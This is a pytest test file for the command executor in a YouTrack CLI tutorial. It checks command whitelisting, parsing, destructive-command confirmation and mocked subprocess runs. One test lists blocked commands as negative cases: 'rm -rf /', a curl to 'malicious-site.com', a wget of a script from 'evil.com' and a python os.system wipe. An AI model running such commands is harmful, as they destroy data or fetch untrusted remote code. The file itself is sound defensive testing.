"""Tests for tutorial command executor."""

from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from youtrack_cli.tutorial.executor import ClickCommandExecutor


class TestClickCommandExecutor:
    """Test cases for ClickCommandExecutor."""

    def setup_method(self):
        """Set up test fixtures."""
        self.config_manager = MagicMock()
        self.executor = ClickCommandExecutor(self.config_manager)

    def test_init(self):
        """Test executor initialization."""
        assert self.executor.config_manager == self.config_manager
        assert self.executor.console is not None
        assert self.executor.auth_manager is not None
        assert len(self.executor.allowed_commands) > 0

    def test_is_command_allowed_basic_commands(self):
        """Test command whitelist validation for basic commands."""
        # Allowed commands
        assert self.executor.is_command_allowed("yt --help")
        assert self.executor.is_command_allowed("yt projects list")
        assert self.executor.is_command_allowed("yt issues create FPU 'Test issue'")
        assert self.executor.is_command_allowed("yt auth login")

        # Commands with environment setup
        assert self.executor.is_command_allowed("source .env.local && yt projects list")
        assert self.executor.is_command_allowed("source .env.local; yt auth status")

    def test_is_command_allowed_blocked_commands(self):
        """Test command whitelist validation for blocked commands."""
        # Dangerous commands should be blocked
        assert not self.executor.is_command_allowed("rm -rf /")
        assert not self.executor.is_command_allowed("curl malicious-site.com")
        assert not self.executor.is_command_allowed("wget http://evil.com/script.sh")
        assert not self.executor.is_command_allowed("python -c 'import os; os.system(\"rm -rf /\")'")
        assert not self.executor.is_command_allowed("arbitrary_command")

    def test_parse_command_basic(self):
        """Test basic command parsing."""
        args = self.executor.parse_command("yt projects list")
        assert args == ["projects", "list"]

    def test_parse_command_with_arguments(self):
        """Test command parsing with arguments."""
        args = self.executor.parse_command("yt issues create FPU 'Test issue'")
        assert args == ["issues", "create", "FPU", "Test issue"]

    def test_parse_command_with_environment_setup(self):
        """Test command parsing with environment setup."""
        args = self.executor.parse_command("source .env.local && yt projects list")
        assert args == ["projects", "list"]

        args = self.executor.parse_command("source .env.local; yt auth status")
        assert args == ["auth", "status"]

    def test_parse_command_without_yt_prefix(self):
        """Test command parsing when yt prefix is already removed."""
        args = self.executor.parse_command("projects list")
        assert args == ["projects", "list"]

    def test_is_destructive_command(self):
        """Test destructive command detection."""
        # Destructive commands
        assert self.executor._is_destructive_command("yt issues delete PROJ-123")
        assert self.executor._is_destructive_command("yt projects remove PROJ")
        assert self.executor._is_destructive_command("yt issues update PROJ-123")
        assert self.executor._is_destructive_command("yt issues create FPU 'Test'")

        # Non-destructive commands
        assert not self.executor._is_destructive_command("yt projects list")
        assert not self.executor._is_destructive_command("yt issues list")
        assert not self.executor._is_destructive_command("yt auth status")
        assert not self.executor._is_destructive_command("yt --help")

    @pytest.mark.asyncio
    async def test_execute_command_blocked(self):
        """Test execution of blocked commands."""
        result = await self.executor.execute_command("rm -rf /", require_confirmation=False)
        assert result is False

    @pytest.mark.asyncio
    @patch("youtrack_cli.tutorial.executor.asyncio.create_subprocess_shell")
    async def test_execute_command_allowed(self, mock_subprocess):
        """Test execution of allowed commands."""
        # Mock successful subprocess execution
        mock_process = AsyncMock()
        mock_process.communicate.return_value = (b"output", b"")
        mock_process.returncode = 0
        mock_subprocess.return_value = mock_process

        result = await self.executor.execute_command("yt --help", require_confirmation=False)
        assert result is True
        mock_subprocess.assert_called_once()

    @pytest.mark.asyncio
    @patch("youtrack_cli.tutorial.executor.asyncio.create_subprocess_shell")
    async def test_execute_command_failed(self, mock_subprocess):
        """Test execution of commands that fail."""
        # Mock failed subprocess execution
        mock_process = AsyncMock()
        mock_process.communicate.return_value = (b"", b"error")
        mock_process.returncode = 1
        mock_subprocess.return_value = mock_process

        result = await self.executor.execute_command("yt invalid-command", require_confirmation=False)
        assert result is False
        mock_subprocess.assert_called_once()

    @pytest.mark.asyncio
    @patch("youtrack_cli.tutorial.executor.click.confirm")
    async def test_execute_command_destructive_with_confirmation(self, mock_confirm):
        """Test execution of destructive commands with confirmation."""
        # User cancels confirmation
        mock_confirm.return_value = False
        result = await self.executor.execute_command("yt issues delete PROJ-123", require_confirmation=True)
        assert result is False
        mock_confirm.assert_called_once()

    def test_add_allowed_command(self):
        """Test adding commands to whitelist."""
        initial_count = len(self.executor.allowed_commands)
        self.executor.add_allowed_command("yt custom command")
        assert len(self.executor.allowed_commands) == initial_count + 1
        assert "yt custom command" in self.executor.allowed_commands

    def test_remove_allowed_command(self):
        """Test removing commands from whitelist."""
        # Add a command first
        self.executor.add_allowed_command("yt temp command")
        initial_count = len(self.executor.allowed_commands)

        # Remove it
        self.executor.remove_allowed_command("yt temp command")
        assert len(self.executor.allowed_commands) == initial_count - 1
        assert "yt temp command" not in self.executor.allowed_commands

    @pytest.mark.asyncio
    @patch("youtrack_cli.tutorial.executor.asyncio.create_subprocess_shell")
    async def test_execute_via_subprocess_success(self, mock_subprocess):
        """Test subprocess execution method with successful command."""
        # Mock successful subprocess execution
        mock_process = AsyncMock()
        mock_process.communicate.return_value = (b"success output", b"")
        mock_process.returncode = 0
        mock_subprocess.return_value = mock_process

        result = await self.executor._execute_via_subprocess("yt --version")
        assert result is True
        mock_subprocess.assert_called_once()

    @pytest.mark.asyncio
    @patch("youtrack_cli.tutorial.executor.asyncio.create_subprocess_shell")
    async def test_execute_via_subprocess_failure(self, mock_subprocess):
        """Test subprocess execution method with failed command."""
        # Mock failed subprocess execution
        mock_process = AsyncMock()
        mock_process.communicate.return_value = (b"", b"error output")
        mock_process.returncode = 1
        mock_subprocess.return_value = mock_process

        result = await self.executor._execute_via_subprocess("yt invalid")
        assert result is False
        mock_subprocess.assert_called_once()

    @pytest.mark.asyncio
    @patch("youtrack_cli.tutorial.executor.asyncio.create_subprocess_shell")
    async def test_execute_via_subprocess_exception(self, mock_subprocess):
        """Test subprocess execution method with exception."""
        # Mock subprocess exception
        mock_subprocess.side_effect = Exception("Subprocess failed")

        result = await self.executor._execute_via_subprocess("yt --help")
        assert result is False
        mock_subprocess.assert_called_once()


class TestClickCommandExecutorIntegration:
    """Integration tests for ClickCommandExecutor."""

    def setup_method(self):
        """Set up integration test fixtures."""
        self.executor = ClickCommandExecutor()

    def test_real_command_parsing(self):
        """Test command parsing with real YouTrack CLI commands."""
        # Test various real command formats
        test_cases = [
            ("yt --help", ["--help"]),
            ("yt projects list", ["projects", "list"]),
            (
                "yt issues create FPU 'My Issue' --description 'Test'",
                ["issues", "create", "FPU", "My Issue", "--description", "Test"],
            ),
            ("source .env.local && yt auth status", ["auth", "status"]),
        ]

        for command, expected in test_cases:
            args = self.executor.parse_command(command)
            assert args == expected, f"Failed for command: {command}"

    def test_security_whitelist_coverage(self):
        """Test that security whitelist covers common tutorial commands."""
        common_tutorial_commands = [
            "yt --help",
            "yt projects list",
            "yt issues list",
            "yt auth status",
            "yt tutorial list",
            "source .env.local && yt projects list",
        ]

        for command in common_tutorial_commands:
            assert self.executor.is_command_allowed(command), f"Command should be allowed: {command}"
